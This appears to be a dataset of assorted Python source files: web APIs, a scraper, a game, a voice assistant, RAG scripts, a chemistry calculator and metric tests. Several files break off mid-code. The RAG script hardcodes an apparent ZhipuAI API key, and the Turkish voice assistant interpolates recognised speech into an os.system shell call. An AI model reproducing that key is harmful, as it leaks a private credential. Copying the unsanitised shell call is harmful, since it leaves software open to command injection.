    "from fastapi import FastAPI, Request, Query, HTTPException\r\nfrom fastapi.responses import StreamingResponse, HTMLResponse, RedirectResponse\r\nfrom fastapi.templating import Jinja2Templates\r\nfrom fastapi.staticfiles import StaticFiles\r\nimport logging\r\nimport os\r\nfrom datetime import datetime, timezone\r\nfrom dotenv import load_dotenv\r\nimport httpx\r\nimport json\r\nfrom query_openai import QueryOpenAi\r\n\r\n# Initialize FastAPI app\r\napp = FastAPI()\r\n\r\n# Mount static directory for CSS, JS, and images\r\napp.mount(\"/static\", StaticFiles(directory=\"static\"), name=\"static\")\r\n\r\n# Initialize Jinja2 templates\r\ntemplates = Jinja2Templates(directory=\"templates\")\r\n\r\n# Load environment variables\r\nload_dotenv()\r\n\r\n@app.get(\"/\", response_class=HTMLResponse)\r\nasync def login(request: Request):\r\n    '''\r\n        default application endpoint \r\n        directly renders the index.html template\r\n    '''\r\n    return templates.TemplateResponse(\"index.html\", {\"request\": request, \"username\": \"Guest\"})\r\n\r\n@app.get(\"/home\", response_class=HTMLResponse)\r\nasync def auth_redirect(request: Request):\r\n    '''\r\n        home endpoint \r\n        directly renders the index.html template\r\n    '''\r\n    return templates.TemplateResponse(\"index.html\", {\"request\": request, \"username\": \"Guest\"})\r\n\r\n# Streaming endpoint\r\n@app.get(\"/stream\")\r\nasync def stream(\r\n    request: Request,\r\n    search_query: str = Query(...),\r\n    topNDocuments: int = Query(5),\r\n    sessionID: str = Query(...),\r\n):\r\n    print(\r\n        f\"search_query is {search_query}, topNDocuments is {topNDocuments}, sessionID is {sessionID}\"\r\n    )\r\n    # Write sessionID to a file\r\n    with open(\"sessionID.txt\", \"w\") as f:\r\n        f.write(sessionID)\r\n\r\n    query_rag = QueryOpenAi()\r\n    \r\n\r\n    def event_generator():\r\n        response_chunks = []\r\n        for content in query_rag.query_openai(search_query):\r\n            json_content = json.dumps({'type': 'response', 'data': content})\r\n            # Make the response SSE compliant\r\n            sse_content = f\"data: {json_content}\\n\\n\"\r\n            print(sse_content)  # Debugging: Print the content to the console\r\n            yield sse_content\r\n\r\n    return StreamingResponse(event_generator(), media_type=\"text/event-stream\")\r\n\r\nif __name__ == \"__main__\":\r\n    import uvicorn\r\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom bs4 import BeautifulSoup\nimport json\n\nurl = 'https://genshin.honeyhunterworld.com/fam_chars/?lang=EN'\n\ndriver = webdriver.Chrome()\ndriver.get(url)\n\ndropdown = driver.find_element(By.CLASS_NAME, 'sorttable_per_page')\nfor option in dropdown.find_elements(By.TAG_NAME, 'option'):\n    if option.text == '100':\n        option.click()\n        break\n\ndriver.implicitly_wait(10)\n\nsoup = BeautifulSoup(driver.page_source, 'html.parser')\ntable = soup.find('table', {'class': 'genshin_table'})\n\ncharacter_data = {}\n\n# Find <a> elements and pair them with their texts as key-value pairs\nfor row in table.find_all('tr'):\n    cells = row.find_all('td')\n    if len(cells) > 1:\n        name_cell = cells[1]\n        a_element = name_cell.find('a')\n        if a_element:\n            href = a_element.get('href')\n            character_name = a_element.text\n            if href:\n                character_url = href.split('/')[1]\n                character_data[character_url] = character_name\n\n# Sort the dictionary by values/attributes\nsorted_character_data = dict(sorted(character_data.items(), key=lambda item: item[1]))\n\n# Don't worry all this does is remove the female traveler :insanity:\nunique_character_data = {k: v for k, v in sorted_character_data.items() if list(sorted_character_data.values()).index(v) == list(sorted_character_data.keys()).index(k)}\n\nwith open('paths.json', 'w') as f:\n    json.dump(unique_character_data, f, indent=4)\n\ndriver.quit()\n",
    "from ursina import *\r\nfrom ursina.prefabs.first_person_controller import FirstPersonController\r\nimport random\r\nimport time as t\r\nimport cv2\r\nimport mss\r\nimport numpy\r\n\r\nimport os\r\nimport numpy as np\r\nfrom scipy import ndimage\r\nfrom pydub import AudioSegment\r\nfrom pydub.playback import play\r\nimport pyrealsense2 as rs\r\nimport cv2\r\n\r\n\r\napp = Ursina()\r\napplication.vsync = False \r\napplication.time_scale = 0.5\r\n\r\n#window.position = (0, 0)\r\n#window.size = (640, 480)\r\nmonitor = {\"top\": window.position[0], \"left\": window.position[1], \\\r\n           \"width\": window.size[0], \"height\": window.size[1]}\r\n\r\ndepth_map_shader = Shader(language=Shader.GLSL, vertex='''\r\n            #version 140\r\n            \r\n            in vec4 p3d_Vertex;\r\n            in vec2 p3d_MultiTexCoord0;\r\n\r\n            uniform mat4 p3d_ModelViewProjectionMatrix;\r\n\r\n            out float depth;\r\n\r\n            void main() {\r\n                gl_Position = p3d_ModelViewProjectionMatrix * p3d_Vertex;\r\n                depth = 1 - gl_Position.z / 50;\r\n            }\r\n        ''', fragment='''\r\n            #version 140\r\n            \r\n            in float depth;\r\n            \r\n            void main() {\r\n                gl_FragColor = vec4(1-depth, 0, depth, 1.0);\r\n            }\r\n        ''')\r\n\r\n\r\nstart_time = t.time()\r\nplayer = FirstPersonController()\r\nplayer.cursor.visible = False\r\nplayer.speed = 10\r\nplayer.start_position = Vec3(0, 0, 0)\r\nplayer.collider = BoxCollider(player, size=(1, 2, 1))\r\nplayer.position = player.start_position\r\n\r\nfloor = Entity(model='plane', scale=(100, 1, 100), texture='white_cube', collider='box', color=color.black, shader = depth_map_shader)\r\nwalls = [Entity(model='cube', scale=(100, 50, 1), position=Vec3(0, 2.5, 50), collider='cube', color=color.black, shader = depth_map_shader),\r\n    Entity(model='cube', scale=(100, 50, 1), position=Vec3(0, 2.5, -50), collider='cube', color=color.black, shader = depth_map_shader),\r\n    Entity(model='cube', scale=(1, 50, 100), position=Vec3(50, 2.5, 0), collider='cube', color=color.black, shader = depth_map_shader),\r\n    Entity(model='cube', scale=(1, 50, 100), position=Vec3(-50, 2.5, 0), collider='cube', color=color.black, shader = depth_map_shader)]\r\n\r\nobstacles = [Entity(model='cube', scale=(2, 20, 2), position=Vec3(random.randint(-48, 48), 1, random.randint(-48, 48)), collider='box', color=color.blue) for _ in range(30)]\r\n\r\n\r\nfor obstacle in obstacles:\r\n    obstacle.shader = depth_map_shader\r\n\r\n\r\ndef restart_game():\r\n    global start_time, obstacles\r\n    player.position = player.start_position\r\n    start_time = t.time()\r\n    #obstacles = [Entity(model='cube', scale=(2, 20, 2), position=Vec3(random.randint(-48, 48), 1, random.randint(-48, 48)), collider='box', color=color.blue) for _ in range(30)]\r\n\r\n\r\n            \r\n\r\n\r\ndef depth_to_audio(depth_image, threshold=4000):\r\n\r\n    # Resample the depth image to 64x48 using nearest-neighbor sampling (order=0)\r\n    resampled_depth_image = ndimage.zoom(depth_image, (64 / depth_image.shape[0], 48 / depth_image.shape[1]), order=0)\r\n    resampled_depth_image = resampled_depth_image\r\n\r\n    # Divide the resampled image into left, center, and right portions\r\n    left = resampled_depth_image[:, :21]\r\n    center = resampled_depth_image[:, 21:42]\r\n    right = resampled_depth_image[:, 42:]\r\n\r\n    # Calculate the median depth values for each portion\r\n    left_median = np.mean(left)\r\n    center_median = np.mean(center)\r\n    right_median = np.mean(right)\r\n    print(left_median, center_median, right_median)\r\n\r\n    # Load the MP3 files\r\n    sound_folder = \"sound\"\r\n    left_sound = AudioSegment.from_mp3(os.path.join(sound_folder, \"left.mp3\"))\r\n    center_sound = AudioSegment.from_mp3(os.path.join(sound_folder, \"center.mp3\"))\r\n    right_sound = AudioSegment.from_mp3(os.path.join(sound_folder, \"right.mp3\"))\r\n\r\n    # Create an empty stereo AudioSegment to mix the sounds\r\n    #silent_mono = AudioSegment.silent(duration=max(len(left_sound), len(center_sound), len(right_sound)))\r\n    silent_mono = AudioSegment.silent(duration=max(len(left_sound), len(center_sound), len(right_sound)))\r\n    mixed_audio = silent_mono.set_channels(2)\r\n\r\n    # Define a function to convert depth to volume in dB\r\n    def depth_to_volume(depth, max_depth, min_volume=-60, max_volume=0):\r\n        return np.interp(depth, (0, max_depth), (max_volume, min_volume))\r\n\r\n    # Set the volume for each sound proportional to the median depth value, pan them, and mix them\r\n    if left_median < threshold:\r\n        left_volume = depth_to_volume(left_median, threshold)\r\n        left_sound = left_sound + left_volume\r\n        left_sound = left_sound.pan(-1)  # Pan fully to the left\r\n        mixed_audio = mixed_audio.overlay(left_sound)\r\n\r\n    if center_median < threshold:\r\n        center_volume = depth_to_volume(center_median, threshold)\r\n        center_sound = center_sound + center_volume\r\n        center_sound = center_sound.pan(0)  # Pan to the center\r\n        mixed_audio = mixed_audio.overlay(center_sound)\r\n\r\n    if ",
    "import speech_recognition as sr\nimport os\nimport requests\n\nrecognizer = sr.Recognizer()\n\ndef speak(text):\n    os.system(f\"termux-tts-speak -l tr-TR -r 1.3 '{text}'\")\n\nwhile True:\n    with sr.Microphone() as source:\n        print(\"Sizi dinliyorum... (\u00c7\u0131kmak i\u00e7in '\u00c7\u0131k' yaz\u0131n)\")\n        recognizer.adjust_for_ambient_noise(source)\n\n        try:\n            audio = recognizer.listen(source)\n            print(\"Ses al\u0131nd\u0131, i\u015fleniyor...\")\n\n\n            text = recognizer.recognize_google(audio, language=\"tr-TR\")\n            print(f\"S\u00f6yledi\u011finiz \u015fey: {text}\")\n\n            if '\u00e7\u0131k' in text.lower():\n                print(\"\u00c7\u0131k\u0131l\u0131yor...\")\n                speak(\"\u00c7\u0131k\u0131l\u0131yor...\")\n                break\n\n            data = {\"prompt\": text}\n            try:\n                api_url = \"http://localhost:3001/generateContent\"\n                response = requests.post(api_url, json=data)\n                response_data = response.json()\n\n                if response.status_code == 200:\n                    gemini_response = response_data.get(\"response\")\n                    print(f\"Gemini'den gelen cevap: {gemini_response}\")\n                    speak(gemini_response) \n                else:\n                    print(\"Gemini API hatas\u0131\")\n            except requests.exceptions.RequestException as e:\n                print(f\"API iste\u011fi s\u0131ras\u0131nda hata olu\u015ftu: {e}\")\n\n        except sr.UnknownValueError:\n            print(\"Google Speech Recognition sesi anlayamad\u0131\")\n        except sr.RequestError as e:\n            print(f\"Google Speech Recognition servisine ula\u015f\u0131lam\u0131yor; hata: {e}\")\n",
    "import numpy as np\nfrom sentence_transformers import SentenceTransformer\nimport faiss\nfrom langchain_community.document_loaders import PyPDFLoader\nfrom langchain_openai import ChatOpenAI\nfrom langchain_core.prompts import PromptTemplate\nfrom langchain.chains import LLMChain\n\n# \u73af\u5883\u53d8\u91cf\u914d\u7f6e\uff0c\u786e\u4fdd\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u4f7f\u7528\u6b63\u786e\u7684API\u5bc6\u94a5\nZHIPUAI_API_KEY = 'ee7e8ba57eae412c933a4eac24619c74.RoCr0aGU0v4SdMkI'\n\n# \u521d\u59cb\u5316SentenceTransformer\u6a21\u578b\uff0c\u7528\u4e8e\u6587\u672c\u5411\u91cf\u5316\nmodel = SentenceTransformer('all-MiniLM-L6-v2')  # \u4f60\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7684\u6a21\u578b\ndim = 384  # \u8fd9\u4e2a\u6a21\u578b\u7684\u5411\u91cf\u7ef4\u5ea6\nindex = faiss.IndexFlatL2(dim)  # \u4f7f\u7528L2\u8ddd\u79bb\u7684FAISS\u7d22\u5f15\n\n\n# \u52a0\u8f7d\u548c\u5904\u7406PDF\u6587\u4ef6\ndef pdf_loader(filepath):\n    \"\"\"\n    \u52a0\u8f7dPDF\u6587\u4ef6\u5185\u5bb9\u5e76\u63d0\u53d6\u6587\u672c\u3002\n    :param filepath: PDF\u6587\u4ef6\u8def\u5f84\n    :return: \u8fd4\u56de\u63d0\u53d6\u7684\u6587\u672c\u5185\u5bb9\n    \"\"\"\n    loader = PyPDFLoader(filepath)\n    pages = loader.load_and_split()\n    return [page.page_content for page in pages]\n\n\n# \u5c06PDF\u6587\u4ef6\u5185\u5bb9\u52a0\u8f7d\u5e76\u8f6c\u5316\u4e3a\u5411\u91cf\uff0c\u5b58\u50a8\u5230FAISS\u5411\u91cf\u6570\u636e\u5e93\u4e2d\ndef load_pdf_and_index(filepath):\n    \"\"\"\n    \u52a0\u8f7dPDF\u5e76\u5c06\u5176\u5185\u5bb9\u8f6c\u5316\u4e3a\u5411\u91cf\uff0c\u5b58\u5165FAISS\u7d22\u5f15\u3002\n    :param filepath: PDF\u6587\u4ef6\u8def\u5f84\n    :return: \u8fd4\u56dePDF\u7684\u6587\u672c\u5185\u5bb9\u5217\u8868\n    \"\"\"\n    pages_content = pdf_loader(filepath)\n    embeddings = model.encode(pages_content)\n    index.add(np.array(embeddings))  # \u5c06\u6587\u672c\u5411\u91cf\u52a0\u5165FAISS\u7d22\u5f15\n    return pages_content\n\n\n# \u521d\u59cb\u5316\u667a\u8c31GLM-4\u6a21\u578b\ndef zhipu_glm_4_long(temperature=0.9):\n    \"\"\"\n    \u83b7\u53d6\u667a\u8c31\u7684GLM-4\u957f\u6587\u672c\u6a21\u578b\u3002\n    :param temperature: \u6a21\u578b\u7684\u6e29\u5ea6\n    :return: ChatOpenAI \u5b9e\u4f8b\n    \"\"\"\n    model = ChatOpenAI(temperature=temperature, model=\"glm-4-long\",\n                       openai_api_key=ZHIPUAI_API_KEY,\n                       openai_api_base=\"https://open.bigmodel.cn/api/paas/v4/\")\n    return model\n\n\n# \u57fa\u4e8eLLM\u94fe\u751f\u6210\u5bf9\u8bdd\u5f0f\u56de\u7b54\ndef base_llm_chain(model, prompt, **kwargs):\n    \"\"\"\n    \u521b\u5efa\u5e76\u8fd0\u884cLLM\u94fe\uff0c\u751f\u6210\u6a21\u578b\u7684\u54cd\u5e94\u3002\n    :param model: \u4f7f\u7528\u7684LLM\u6a21\u578b\n    :param prompt: \u6a21\u677f\u4e2d\u7684prompt\n    :param kwargs: \u63d0\u4f9b\u7ed9\u6a21\u677f\u7684\u53c2\u6570\n    :return: \u6a21\u578b\u7684\u54cd\u5e94\u7ed3\u679c\n    \"\"\"\n    prompt_template = PromptTemplate.from_template(prompt)\n    chain = LLMChain(llm=model, prompt=prompt_template)\n    result = chain.run(kwargs)\n    return result\n\n\n# \u5728FAISS\u7d22\u5f15\u4e2d\u67e5\u8be2\u4e0e\u7528\u6237\u95ee\u9898\u6700\u76f8\u4f3c\u7684\u6587\u672c\u6bb5\u843d\ndef search_similar_texts(query, k=3):\n    \"\"\"\n    \u6839\u636e\u7528\u6237\u7684\u67e5\u8be2\u95ee\u9898\uff0c\u5728FAISS\u7d22\u5f15\u4e2d\u67e5\u627e\u6700\u76f8\u4f3c\u7684\u6587\u672c\u3002\n    :param query: \u7528\u6237\u7684\u67e5\u8be2\u95ee\u9898\n    :param k: \u8fd4\u56de\u6700\u76f8\u4f3c\u7684k\u4e2a\u6bb5\u843d\n    :return: \u8fd4\u56de\u6700\u76f8\u5173\u7684\u6587\u672c\u6bb5\u843d\n    \"\"\"\n    query_vector = model.encode([query])  # \u5c06\u67e5\u8be2\u95ee\u9898\u8f6c\u5316\u4e3a\u5411\u91cf\n    _, indices = index.search(np.array(query_vector), k=k)  # \u67e5\u8be2FAISS\u7d22\u5f15\n    return indices[0]  # \u8fd4\u56de\u6700\u76f8\u4f3c\u7684k\u4e2a\u6587\u672c\u6bb5\u843d\u7684\u7d22\u5f15\n\n\n# \u793a\u4f8b\u51fd\u6570\uff1a\u4ecePDF\u6587\u4ef6\u52a0\u8f7d\u5e76\u6839\u636e\u67e5\u8be2\u751f\u6210\u56de\u7b54\ndef get_answer_from_pdf(pdf_filepath, query):\n    \"\"\"\n    \u4ecePDF\u6587\u4ef6\u52a0\u8f7d\u5185\u5bb9\u5e76\u56de\u7b54\u95ee\u9898\u3002\n    :param pdf_filepath: PDF\u6587\u4ef6\u8def\u5f84\n    :param query: \u7528\u6237\u7684\u67e5\u8be2\u95ee\u9898\n    :return: \u8fd4\u56de\u751f\u6210\u7684\u56de\u7b54\n    \"\"\"\n    # \u52a0\u8f7dPDF\u5e76\u5efa\u7acbFAISS\u7d22\u5f15\n    load_pdf_and_index(pdf_filepath)\n\n    # \u6839\u636e\u67e5\u8be2\u95ee\u9898\uff0c\u67e5\u8be2FAISS\u7d22\u5f15\u5e76\u83b7\u53d6\u76f8\u5173\u6587\u672c\n    relevant_indices = search_similar_texts(query, k=3)\n\n    # \u63d0\u53d6\u76f8\u5173\u7684\u6587\u672c\u5185\u5bb9\n    relevant_texts = []\n    for i in relevant_indices:\n        relevant_texts.append(pdf_loader(pdf_filepath)[i])\n\n    # \u683c\u5f0f\u5316\u5bf9\u8bdd\u6837\u5f0f\u7684prompt\n    prompt = f\"\"\"\n    \u7ed9\u4f60\u63d0\u4f9b PDF \u7535\u5b50\u4e66\u5185\u5bb9\uff0c\u8bf7\u8ba4\u771f\u9605\u8bfb\u5e76\u7406\u89e3\u6bcf\u4e00\u9875\u7684\u6838\u5fc3\u5185\u5bb9\uff0c\u5e76\u56de\u7b54\u95ee\u9898\uff0c\u4ee5\u4e0b\u662f\u7535\u5b50\u4e66\u7684\u6bcf\u4e00\u9875\u5185\u5bb9\uff1a\n    ----------------------------------------------------------\n    \u95ee\u9898\uff1a\u603b\u7ed3\u8fd9\u90e8\u5206\u5185\u5bb9\u63a8\u8350\u7684\u65e5\u5e38\u884c\u4e3a\u539f\u5219\uff0c\u4ee5\u53ca\u5b83\u4eec\u7684\u4f7f\u7528\u573a\u666f\u3002\n\n    \u8bf7\u4ee5\u5bf9\u8bdd\u7684\u5f62\u5f0f\u56de\u590d\uff0c\u6bcf\u4e00\u6bb5\u5185\u5bb9\u540e\u90fd\u8981\u6709\u4e00\u4e2a\u7b80\u77ed\u3001\u81ea\u7136\u7684\u5bf9\u8bdd\u5f0f\u56de\u7b54\uff0c\u907f\u514d\u76f4\u63a5\u5217\u4e3e\u3002\u793a\u4f8b\u56de\u7b54\u53ef\u4ee5\u50cf\u8fd9\u6837\uff1a\n    \u7528\u6237\uff1a\u6839\u636e\u8fd9\u672c\u4e66\uff0c\u63a8\u8350\u7684\u884c\u4e3a\u539f\u5219\u662f\u4ec0\u4e48\uff1f\n    AI\uff1a\u4e66\u4e2d\u63d0\u5230\u7684\u4e00\u4e2a\u884c\u4e3a\u539f\u5219\u662f\uff1a\u4fdd\u6301\u6bcf\u65e5\u53cd\u601d\u3002\u4f7f\u7528\u573a\u666f\uff1a\u5728\u5fd9\u788c\u7684\u5de5\u4f5c\u65e5\u7ed3\u675f\u540e\uff0c\u6bcf\u665a\u82b1\u4e9b\u65f6\u95f4\u601d\u8003\u4eca\u5929\u505a\u5f97\u5982\u4f55\u3002\n\n    \u8bf7\u5f00\u59cb\u4f60\u7684\u56de\u7b54\uff1a\n    \"\"\"\n\n    # \u83b7\u53d6\u667a\u8c31GLM-4\u6a21\u578b\n    llm = zhipu_glm_4_long(temperature=0.9)\n\n    # \u83b7\u53d6\u751f\u6210\u7684\u56de\u7b54\n    response = base_llm_chain(llm, prompt)\n    return response",
    "# -*- coding: utf-8 -*-\n\"\"\"Tools for interfacing with `ASE`_.\n.. _ASE:\n    https://wiki.fysik.dtu.dk/ase\n\n\nBase for the code from https://github.com/aiqm/torchani/blob/master/torchani/ase.py provided under MIT license\nhttps://github.com/aiqm/torchani/blob/master/LICENSE 20/9/2022\n\"\"\"\n\nimport torch\nfrom torchani import utils\nimport ase.calculators.calculator\nimport ase.units\nimport re\nimport numpy as np\nfrom itertools import groupby\n\n\nclass Calculator(ase.calculators.calculator.Calculator):\n    \"\"\"BNN-ANI calculator.py for ASE\n    Arguments:\n        species (:class:`collections.abc.Sequence` of :class:`str`):\n            sequence of all supported species, in order.\n        model (:class:`torch.nn.Module`): neural network potential model\n            that convert coordinates into energies.\n        overwrite (bool): After wrapping atoms into central box, whether\n            to replace the original positions stored in :class:`ase.Atoms`\n            object with the wrapped positions.\n        mc_runs (integer): Number of samples to draw to determine energy mean/uncertainty\n    \"\"\"\n\n    implemented_properties = ['energy', 'forces', 'stress', 'free_energy', 'energy_uncertainty',\n                              'free_energy_uncertainty']\n\n    def __init__(self, species, model, overwrite=False, mc_runs=20, mc_forces_cov=False, periodic_table_indices=False, units=\"eV\"):\n        \"\"\"\n        Initialization funtion for the class\n        :param species: sequence of strings or string - element labels\n        :param model: torch.nn.Module - torch model to run the evaluations\n        :param overwrite: bool - overwrite or not\n        :param mc_runs: int - number of monte carlo runs to use for sampling\n        :param mc_forces_cov: bool - flag indicating whether to compute the full covariance for the forces\n        :param periodic_table_indices: bool - use periodic table numbering or not\n        :param units: str - expected units has no direct effect but makes it easy to know the units you are working in\n        \"\"\"\n        super().__init__()\n        self.model = model\n        self.species_to_tensor = utils.ChemicalSymbolsToInts(species)\n        self.mc_runs = mc_runs\n        self.mc_forces_cov = mc_forces_cov\n        self.units = units\n        # Since ANI is used in inference mode, no gradients on model parameters are required here\n        for p in self.model.parameters():\n            p.requires_grad_(False)\n        self.overwrite = overwrite\n\n        a_parameter = next(self.model.parameters())\n        self.device = a_parameter.device\n        self.dtype = a_parameter.dtype\n\n        if periodic_table_indices is True:\n            # We assume that the model has a \"periodic_table_index\" attribute\n            # if it doesn't we set the calculator.py's attribute to false and we\n            # assume that species will be correctly transformed by\n            # species_to_tensor\n            self.periodic_table_index = periodic_table_indices\n        else:\n            self.periodic_table_index = False\n\n    def calculate(self, atoms: ase.Atoms = None, properties=['energy', 'energy_uncertainty'],\n                  system_changes=ase.calculators.calculator.all_changes):\n        \"\"\"\n        Method to calculate energies, stresses and forces\n        :param atoms: ase.Atoms or None - the atoms object to use\n        :param properties: list - properties to compute\n        :param system_changes: ase.calculators.calculator.all_changes - updated changes to system\n        :return:\n        \"\"\"\n        super().calculate(atoms, properties, system_changes)\n        cell = torch.tensor(np.array(self.atoms.get_cell(complete=True)),\n                            dtype=self.dtype, device=self.device)\n        pbc = torch.tensor(self.atoms.get_pbc(), dtype=torch.bool,\n                           device=self.device)\n        pbc_enabled = pbc.any().item()\n\n        if self.periodic_table_index:\n            species = torch.tensor(self.atoms.get_atomic_numbers(), dtype=torch.long, device=self.device)\n        else:\n            species = self.species_to_tensor(self.atoms.get_chemical_symbols()).to(self.device)\n\n        coordinates = torch.tensor(self.atoms.get_positions())\n        coordinates = coordinates.to(self.device).to(self.dtype) \\\n                                 .requires_grad_('forces' in properties)\n\n        if pbc_enabled:\n            coordinates = utils.map2central(cell, coordinates, pbc)\n            if self.overwrite and atoms is not None:\n                atoms.set_positions(coordinates.detach().cpu().reshape(-1, 3).numpy())\n\n        if 'stress' in properties:\n            scaling = torch.eye(3, requires_grad=True, dtype=self.dtype, device=self.device)\n            coordinates = coordinates @ scaling\n        coordinates = coordinates\n\n        sp_stack = torch.stack([species for _ in range(self.mc_runs)])\n        coord_stack = torch.stack([coordinates for _ in range(self.mc_runs)])\n\n        if pbc_enabled:\n            if 'stress' in properties:\n                ce",
    "from fastapi import FastAPI\r\nfrom pydantic import BaseModel\r\nimport pickle\r\nimport json\r\n\r\napp = FastAPI()\r\n\r\nclass model_input(BaseModel):\r\n    \r\n    pregnancies : int\r\n    Glucose : int\r\n    BloodPressure : int\r\n    SkinThickness : int\r\n    Insulin : int\r\n    BMI : float\r\n    DiabetesPedigreeFunction : float\r\n    Age : int       \r\n        \r\n# Loading the saved model\r\ndiabetes_model = pickle.load(open('diabetes_model.sav', 'rb'))\r\n\r\n@app.post('/diabetes_prediction')\r\ndef diabetes_predd(input_parameters : model_input):\r\n    \r\n    input_data = input_parameters.json()\r\n    input_dictionary = json.loads(input_data)\r\n    \r\n    preg = input_dictionary['pregnancies']\r\n    glu = input_dictionary['Glucose']\r\n    bp = input_dictionary['BloodPressure']\r\n    skin = input_dictionary['SkinThickness']\r\n    insulin = input_dictionary['Insulin']\r\n    bmi = input_dictionary['BMI']\r\n    dpf = input_dictionary['DiabetesPedigreeFunction']\r\n    age = input_dictionary['Age']\r\n    \r\n    input_list = [preg, glu, bp, skin, insulin, bmi, dpf, age]\r\n    \r\n    prediction = diabetes_model.predict([input_list])\r\n    \r\n    if (prediction[0] == 0):\r\n        return 'The person is not diabetic'\r\n    else:\r\n        return 'The person is diabetic'\r\n    \r\n    \r\n\r\n\r\n\r\n",
    "import time\nimport logging\nimport tempfile\nfrom pathlib import Path\nfrom typing import List, Tuple, Union\nfrom tqdm import tqdm\nimport shutil\n\nfrom llm import LLMClient\nfrom converters.ppt_converter import convert_pptx_to_pdf\nfrom converters.pdf_converter import convert_pdf_to_images\nfrom converters.docker_converter import convert_pptx_via_docker\nfrom schemas.deck import DeckData, SlideData\n\n# Create a type alias for all possible clients\nlogger = logging.getLogger(__name__)\n\n\ndef process_single_file(\n    ppt_file: Path,\n    output_dir: Path,\n    libreoffice_path: Path,\n    model_instance: LLMClient,\n    rate_limit: int,\n    prompt: str,\n    save_pdf: bool = False,\n    save_images: bool = False\n) -> Tuple[Path, List[Path]]:\n    \"\"\"\n    Process a single PowerPoint file:\n      1) Convert to PDF\n      2) Convert PDF to images\n      3) Send images to LLM\n      4) Save the JSON output\n      5) Optionally save PDF and images to output directory\n    \"\"\"\n    with tempfile.TemporaryDirectory() as temp_dir_str:\n        temp_dir = Path(temp_dir_str)\n\n        try:\n            # 1) PPT -> PDF\n            pdf_path = convert_pptx_to_pdf(ppt_file, libreoffice_path, temp_dir)\n            logger.info(f\"Successfully converted {ppt_file.name} to {pdf_path.name}\")\n\n            # 2) PDF -> Images\n            image_paths = convert_pdf_to_images(pdf_path, temp_dir)\n            if not image_paths:\n                logger.error(f\"No images were generated from {pdf_path.name}\")\n                return (ppt_file, [])\n\n            # 3) Generate LLM content\n            min_interval = 60.0 / rate_limit if rate_limit > 0 else 0\n            last_call_time = 0.0\n\n            slides_data = []\n            # Sort images by slide number (we know \"slide_{page_num + 1}.png\" format)\n            image_paths.sort(key=lambda p: int(p.stem.split('_')[1]))\n\n            # Initialize tqdm progress bar\n            for idx, image_path in enumerate(tqdm(image_paths, desc=f\"Processing slides for {ppt_file.name}\", unit=\"slide\"), start=1):\n                # Rate-limit logic\n                if min_interval > 0:\n                    current_time = time.time()\n                    time_since_last = current_time - last_call_time\n                    if time_since_last < min_interval:\n                        time.sleep(min_interval - time_since_last)\n                    last_call_time = time.time()\n\n                try:\n                    response = model_instance.generate(prompt, image_path)\n                    slides_data.append(SlideData(\n                        number=idx,\n                        content=response\n                    ))\n                except Exception as e:\n                    logger.error(f\"Error generating content for slide {idx}: {str(e)}\")\n                    slides_data.append(SlideData(\n                        number=idx,\n                        content=\"ERROR: Failed to process slide\"\n                    ))\n\n            logger.info(f\"Successfully converted {ppt_file.name} to {len(slides_data)} slides.\")\n\n            # 4) Build pydantic model and save JSON\n            deck_data = DeckData(\n                deck=ppt_file.name,\n                model=model_instance.model_name,\n                slides=slides_data\n            )\n            output_file = output_dir / f\"{ppt_file.stem}.json\"\n            output_file.write_text(deck_data.model_dump_json(indent=2), encoding='utf-8')\n            logger.info(f\"Output written to {output_file}\")\n\n            # 5) Optionally save PDF\n            if save_pdf:\n                destination_pdf = output_dir / pdf_path.name\n                shutil.copy2(pdf_path, destination_pdf)\n                logger.info(f\"Saved PDF to {destination_pdf}\")\n\n            # 6) Optionally save images\n            if save_images:\n                # Create a subfolder named after the PPT file\n                images_subdir = output_dir / ppt_file.stem\n                images_subdir.mkdir(parents=True, exist_ok=True)\n                for img_path in image_paths:\n                    destination_img = images_subdir / img_path.name\n                    shutil.copy2(img_path, destination_img)\n                logger.info(f\"Saved images to {images_subdir}\")\n\n            return (ppt_file, image_paths)\n\n        except Exception as ex:\n            logger.error(f\"Unexpected error while processing {ppt_file.name}: {str(ex)}\")\n            return (ppt_file, [])\n\ndef process_input_path(\n    input_path: Path,\n    output_dir: Path,\n    libreoffice_path: Union[Path, None],\n    libreoffice_endpoint: Union[str, None],\n    model_instance: LLMClient,\n    rate_limit: int,\n    prompt: str,\n    save_pdf: bool = False,\n    save_images: bool = False\n) -> List[Tuple[Path, List[Path]]]:\n    \"\"\"\n    Process one or more PPT files from the specified path.\n    Optionally save PDFs and images to the output directory.\n    \"\"\"\n    results = []\n\n    # Single file mode\n    if input_path.is_file():\n        if input_path.suffix.lower() in ('.ppt', '.pptx'):\n            res = process",
    "import numpy as np\nfrom src.eval_techniques import (\n    error_rate,\n    accuracy,\n    true_positive_rate,\n    false_positive_rate,\n    precision,\n    f1_score,\n    roc_curve,\n    auc_roc_score,\n)\n\n\ndef test_error_rate():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([True, True, False, False])\n    assert np.isclose(error_rate(predictions, labels), 0.5)\n\n\ndef test_accuracy():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([True, False, True, False])\n    assert np.isclose(accuracy(predictions, labels), 1.0)\n\n\ndef test_true_positive_rate():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([True, True, True, False])\n    assert np.isclose(true_positive_rate(predictions, labels), 0.6667, atol=1e-4)\n\n\ndef test_false_positive_rate():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([False, False, True, True])\n    assert np.isclose(false_positive_rate(predictions, labels), 0.5, atol=1e-4)\n\n\ndef test_precision():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([True, True, True, False])\n    assert np.isclose(precision(predictions, labels), 1.0, atol=1e-4)\n\n\ndef test_f1_score():\n    predictions = np.array([True, False, True, False])\n    labels = np.array([True, True, True, False])\n    assert np.isclose(f1_score(predictions, labels), 0.8, atol=1e-4)\n\n\ndef test_roc_curve():\n    predictions = np.array([0.9, 0.8, 0.7, 0.6, 0.5])\n    labels = np.array([1, 1, 0, 0, 0])\n    tpr, fpr = roc_curve(predictions, labels)\n    assert len(tpr) == len(fpr)\n    assert np.all(tpr >= 0) and np.all(tpr <= 1)\n    assert np.all(fpr >= 0) and np.all(fpr <= 1)\n\n\ndef test_auc_roc_score():\n    predictions = np.array([0.9, 0.8, 0.7, 0.6, 0.4])\n    labels = np.array([1, 1, 1, 1, 0])\n    auc = auc_roc_score(predictions, labels)\n    assert 